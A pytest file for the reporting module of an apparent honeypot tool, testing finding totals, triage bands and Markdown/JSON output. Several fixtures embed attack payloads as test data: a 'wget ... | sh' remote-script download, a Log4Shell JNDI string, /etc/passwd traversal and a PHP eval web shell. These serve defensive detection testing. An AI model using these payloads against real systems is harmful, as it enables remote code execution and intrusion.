"""Findings assembly and rendering."""

from __future__ import annotations

import json

from conftest import make_record

from deception_shield.models import TriageBand
from deception_shield.report import analyse, to_json, to_markdown


class TestAnalyse:
    def test_empty_input_is_safe(self) -> None:
        findings = analyse([])
        assert findings.total_records == 0
        assert findings.patterns == []
        assert findings.campaigns == []

    def test_totals_are_counted(self, botnet_records) -> None:
        findings = analyse(botnet_records)
        assert findings.total_records == len(botnet_records)
        assert findings.unique_sources == 6

    def test_window_spans_the_records(self) -> None:
        records = [make_record(minutes_offset=m) for m in (0, 45)]
        findings = analyse(records)
        assert (findings.window_end - findings.window_start).total_seconds() == 45 * 60

    def test_triage_counts_sum_to_total(self, botnet_records) -> None:
        findings = analyse(botnet_records)
        assert sum(findings.triage_counts.values()) == findings.total_records

    def test_actionable_excludes_benign_and_noise(self) -> None:
        records = [
            make_record("203.0.113.1", payload=b"GET /"),
            make_record("203.0.113.2", payload=b"wget http://x/m.sh | sh"),
        ]
        findings = analyse(records)
        assert findings.actionable_count == 1

    def test_critical_count_tracks_the_top_band(self) -> None:
        payload = b"wget http://a/b | sh ${jndi:ldap://x/y} ../../../../etc/passwd <?php eval($_POST[x]);"
        findings = analyse([make_record(payload=payload)])
        assert findings.triage_counts.get(TriageBand.CRITICAL.value) == 1
        assert findings.critical_count == 1


class TestMarkdown:
    def test_contains_the_expected_sections(self, botnet_records) -> None:
        rendered = to_markdown(analyse(botnet_records))
        for heading in ("## Summary", "## Triage distribution", "## Attack patterns", "## Correlated campaigns"):
            assert heading in rendered

    def test_empty_findings_still_render(self) -> None:
        rendered = to_markdown(analyse([]))
        assert "# Deception Shield activity report" in rendered
        assert "**0**" in rendered

    def test_title_is_configurable(self) -> None:
        assert to_markdown(analyse([]), title="Nightly review").startswith("# Nightly review")

    def test_campaign_sources_are_listed(self, botnet_records) -> None:
        rendered = to_markdown(analyse(botnet_records))
        assert "203.0.113.10" in rendered

    def test_sweeps_section_appears(self, sweep_records) -> None:
        assert "## Port sweeps" in to_markdown(analyse(sweep_records))


class TestJson:
    def test_is_valid_json(self, botnet_records) -> None:
        payload = json.loads(to_json(analyse(botnet_records)))
        assert payload["totals"]["records"] == len(botnet_records)

    def test_datetimes_are_iso_strings(self, botnet_records) -> None:
        payload = json.loads(to_json(analyse(botnet_records)))
        assert payload["window"]["start"].startswith("2026-")

    def test_triage_enum_is_serialised_by_value(self) -> None:
        payload = json.loads(to_json(analyse([make_record(payload=b"wget http://x/a | sh")])))
        assert "likely-malicious" in payload["triage"]

    def test_empty_findings_serialise(self) -> None:
        payload = json.loads(to_json(analyse([])))
        assert payload["totals"]["records"] == 0
